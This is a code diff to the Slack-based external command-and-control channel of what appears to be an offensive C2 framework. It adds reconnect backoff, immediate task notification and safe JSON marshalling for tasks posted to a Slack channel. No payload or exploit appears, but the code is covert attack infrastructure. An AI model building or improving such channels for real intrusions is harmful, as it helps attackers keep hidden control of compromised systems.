@@ -57,6 +57,8 @@ func (sc *SlackExternalC2) Start() error {
 }
 
 func (sc *SlackExternalC2) runLoop(channelID string) {
+	wait := 5 * time.Second
+	const maxWait = 60 * time.Second
 	for {
 		sc.connectAndRun(channelID)
 		select {
@@ -64,8 +66,12 @@ func (sc *SlackExternalC2) runLoop(channelID string) {
 			slog.Info("Slack External C2 stopped", "channel_id", sc.channelID)
 			return
 		default:
-			slog.Info("Slack External C2 reconnecting in 5s", "channel_id", sc.channelID)
-			time.Sleep(5 * time.Second)
+			slog.Info("Slack External C2 reconnecting", "channel_id", sc.channelID, "wait", wait)
+			time.Sleep(wait)
+			wait *= 2
+			if wait > maxWait {
+				wait = maxWait
+			}
 		}
 	}
 }
@@ -76,6 +82,10 @@ func (sc *SlackExternalC2) connectAndRun(channelID string) {
 
 	taskSenderDone := make(chan struct{})
 
+	sc.server.extC2TaskMu.Lock()
+	sc.server.extC2Notify[channelID] = make(chan struct{}, 1)
+	sc.server.extC2TaskMu.Unlock()
+
 	go func() {
 		defer close(taskSenderDone)
 		ticker := time.NewTicker(2 * time.Second)
@@ -84,20 +94,24 @@ func (sc *SlackExternalC2) connectAndRun(channelID string) {
 			select {
 			case <-sc.stopCh:
 				return
+			case <-sc.server.extC2Notify[channelID]:
 			case <-ticker.C:
-				sc.server.extC2TaskMu.Lock()
-				tasks := sc.server.extC2TaskQueue[channelID]
-				sc.server.extC2TaskQueue[channelID] = nil
-				sc.server.extC2TaskMu.Unlock()
-				for _, task := range tasks {
-					taskJSON, _ := json.Marshal(task)
-					_, _, err := sc.client.PostMessage(
-						sc.channelID,
-						slack.MsgOptionText(string(taskJSON), false),
-					)
-					if err != nil {
-						slog.Error("Slack External C2 send failed", "error", err)
-					}
+			}
+			sc.server.extC2TaskMu.Lock()
+			tasks := sc.server.extC2TaskQueue[channelID]
+			sc.server.extC2TaskQueue[channelID] = nil
+			sc.server.extC2TaskMu.Unlock()
+			for _, task := range tasks {
+				taskJSON, ok := marshalJSONSafe(task)
+				if !ok {
+					continue
+				}
+				_, _, err := sc.client.PostMessage(
+					sc.channelID,
+					slack.MsgOptionText(string(taskJSON), false),
+				)
+				if err != nil {
+					slog.Error("Slack External C2 send failed", "error", err)
 				}
 			}
 		}
